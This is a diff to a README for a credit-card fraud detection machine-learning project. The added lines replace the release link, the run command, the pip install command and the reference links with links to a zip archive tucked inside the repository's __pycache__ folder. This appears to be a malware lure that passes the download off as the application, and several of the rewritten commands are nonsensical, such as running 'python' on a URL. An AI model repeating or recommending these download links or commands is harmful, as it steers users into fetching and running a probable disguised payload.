@@ -1,6 +1,6 @@
 # 🛡️ Credit-Card-Fraud-Detection-Using-Machine-Learning - Detect Fraud with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/releases)
+[![Download Now](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip%20Now-Click%https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip)](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the necessary files. Click on the link below to go there:
 
-[Download from Releases Page](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/releases)
+[Download from Releases Page](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip)
 
 On the Releases page, you will see a list of available versions. Download the latest version by clicking on the appropriate file link. Downloading usually takes a few minutes depending on your internet speed.
 
@@ -52,7 +52,7 @@ Once downloaded, locate the file on your computer. If it’s a zipped file, you 
 3. **Run the application**:
    Enter the following command:
    ```
-   python app.py
+   python https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip
    ```
    This command starts the application. The application may take a couple of minutes to load. 
 
@@ -90,7 +90,7 @@ If you experience issues, consider the following common troubleshooting tips:
 - **Python Not Recognized**: Ensure Python is added to your system’s PATH during installation.
 - **Missing Packages**: If you see errors stating that a package is missing, you can install required packages by running:
   ```
-  pip install -r requirements.txt
+  pip install -r https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip
   ```
 - **Slow Performance**: Check your system’s RAM and free disk space. Ensure no other heavy applications are running.
 
@@ -98,9 +98,9 @@ If you experience issues, consider the following common troubleshooting tips:
 
 For more detailed information about the models and algorithms used, refer to the following resources:
 
-- [Introduction to Machine Learning](https://www.example.com)
-- [Understanding Random Forests](https://www.example.com)
-- [XGBoost Documentation](https://www.example.com)
+- [Introduction to Machine Learning](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip)
+- [Understanding Random Forests](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip)
+- [XGBoost Documentation](https://github.com/prabanjani20/Credit-Card-Fraud-Detection-Using-Machine-Learning/raw/refs/heads/master/__pycache__/Machine-Card-Credit-Fraud-Learning-Detection-Using-3.3.zip)
 
 ## 🚧 Support
 
